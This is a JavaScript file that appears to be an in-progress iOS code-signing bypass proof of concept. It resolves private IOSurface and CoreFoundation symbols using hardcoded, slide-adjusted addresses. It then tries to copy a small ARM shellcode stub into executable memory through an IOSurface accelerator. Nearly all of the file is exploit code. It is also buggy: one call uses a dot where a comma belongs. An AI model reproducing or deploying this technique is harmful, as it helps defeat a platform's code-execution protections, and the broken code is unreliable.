var RTLD_NOW = 2;
var PAGE_SIZE = 0x1000;

var CFDictionaryCreateMutable_addr = 0x20809ae1;
var kCFTypeDictionaryKeyCallBacks_addr = 0x343c79cc;
var kCFTypeDictionaryValueCallBacks_addr = 0x343c79fc;
var CFDictionarySetValue_addr = 0x2080a791;
var CFNumberCreate_addr = 0x2080bc79;
var kCFNumberSInt32Type = 3;
var CFShow_addr = 0x208e897c | 1;

var my_kIOSurfaceBytesPerRow;
var my_kIOSurfaceWidth;
var my_kIOSurfaceHeight;
var my_kIOSurfacePixelFormat;

function csbypass() {
	printf("hello from csbypass!\n");
	poc();
}

function memcpy_exec(dst, src, size) {
	var dict = NULL;
	var accel = malloc(4);
	var width = malloc(4);
	var height = malloc(4);
	var pitch = malloc(4);
	var pixel_format = malloc(5);
	write_u32(width, PAGE_SIZE / (16 * 4));
	write_u32(height, 16);
	write_u32(pitch, read_u32(width) * 4);
	write_u32(pixel_format, 0x42475241); // ARGB
	write_u32(pixel_format + 4, 0x0); // ARGB
	printf("%x %x\n", CFDictionarySetValue_addr + get_dyld_shc_slide(), dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue"));
	dict = callnarg(CFDictionaryCreateMutable_addr + get_dyld_shc_slide(), 0, 0, kCFTypeDictionaryKeyCallBacks_addr + get_dyld_shc_slide(), kCFTypeDictionaryValueCallBacks_addr + get_dyld_shc_slide());
	printf("dict: %p\n", dict);
	var test = callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pitch);
	printf("fuck you test=%p %p %p\n", test, pitch, read_u32(dict));
	scall("printf", "%x %x %x %x\n", read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide()), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 4), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 8), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 12));
	callnarg(CFShow_addr + get_dyld_shc_slide(), dict);
	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceBytesPerRow), test);
	printf("fuck1\n");
	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceWidth), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, width));
	printf("fuck2\n");
	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceHeight), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, height));
	printf("fuck3\n");
	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfacePixelFormat), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pixel_format));
	printf("fuck4\n");
	printf("fuck you\n");
	printf("%d\n", callnarg(my_IOSurfaceAcceleratorCreate, 0, 0, accel));
}

function linkIOSurface() {
	h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    
    my_kIOSurfaceBytesPerRow = dlsym(h, "kIOSurfaceBytesPerRow");
    my_kIOSurfaceWidth = dlsym(h, "kIOSurfaceWidth");
    my_kIOSurfaceHeight = dlsym(h, "kIOSurfaceHeight");
    my_kIOSurfacePixelFormat = dlsym(h, "kIOSurfacePixelFormat");

	scall("printf", "%x %x %x %x\n", my_kIOSurfaceBytesPerRow, my_kIOSurfaceWidth, my_kIOSurfaceHeight, my_kIOSurfacePixelFormat);

    my_IOSurfaceAcceleratorCreate = dlsym(h, "IOSurfaceAcceleratorCreate");
    my_IOSurfaceCreate = dlsym(h, "IOSurfaceCreate");
    my_IOSurfaceAcceleratorTransferSurface = dlsym(h, "IOSurfaceAcceleratorTransferSurface");

	CFDictionarySetValue_addr = dlsym(dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW), "CFDictionarySetValue") - get_dyld_shc_slide();

	scall("printf", "%x %x %x\n", my_IOSurfaceAcceleratorCreate, my_IOSurfaceCreate, my_IOSurfaceAcceleratorTransferSurface);
}

function poc() {
	linkIOSurface();

	var tmp = malloc(0x4000);
	var start = [0x4F, 0xF0, 0x82, 0x40, 0x00, 0x47];

	for (var i = 0; i < start.length; i++) {
		write_u8(tmp + i, start[i]);
	}

	var finish = 0x10000;

	memcpy_exec(finish. tmp, 0x1000);

	scall("printf", "%x %x %x %x %x %x %x %x %x %x %x %x %x\n", h, my_kIOSurfaceBytesPerRow, my_kIOSurfaceWidth, my_kIOSurfaceHeight, my_kIOSurfacePixelFormat, my_IOSurfaceAcceleratorCreate, my_IOSurfaceCreate, my_IOSurfaceAcceleratorTransferSurface, 0x41414141);

//	var finish = 
}